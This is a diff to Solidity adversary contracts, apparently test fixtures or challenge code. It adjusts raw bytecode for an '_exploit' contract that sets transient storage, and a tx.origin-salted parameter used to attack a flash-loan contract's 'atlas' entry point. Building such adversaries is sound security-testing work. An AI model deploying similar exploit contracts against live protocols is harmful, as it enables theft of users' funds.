@@ -87,7 +87,7 @@ contract AdversaryBorrower is IFlashLoanReceiver {
         // PUSH1 block.timestamp
         // TSTORE
         bytes memory code =
-            bytes.concat(hex"60098060093d393df3600063", abi.encodePacked(uint32(block.timestamp)), hex"b400");
+            bytes.concat(hex"60088060093d393df3600063", abi.encodePacked(uint32(block.timestamp)), hex"b4");
         address _exploit;
         assembly {
             _exploit := create(0x00, add(code, 0x20), mload(code))
@@ -100,8 +100,9 @@ contract AdversaryBorrower is IFlashLoanReceiver {
         assembly {
             // Store this contract's address in memory @ 0x00
             mstore(0x00, address())
+            mstore(0x20, origin())
             // Assign our param's value
-            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
+            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x40), 0xFFFFFFFF))
         }
         (success,) = address(flashLoaner).call(abi.encodeWithSelector(flashLoaner.atlas.selector, param));
     }
@@ -157,8 +158,9 @@ contract AdversaryStorageBorrower is IFlashLoanReceiver {
         assembly {
             // Store this contract's address in memory @ 0x00
             mstore(0x00, address())
+            mstore(0x20, origin())
             // Assign our param's value
-            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
+            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x40), 0xFFFFFFFF))
         }
         (success,) = address(flashLoaner).call(abi.encodeWithSelector(flashLoaner.atlas.selector, param));
     }
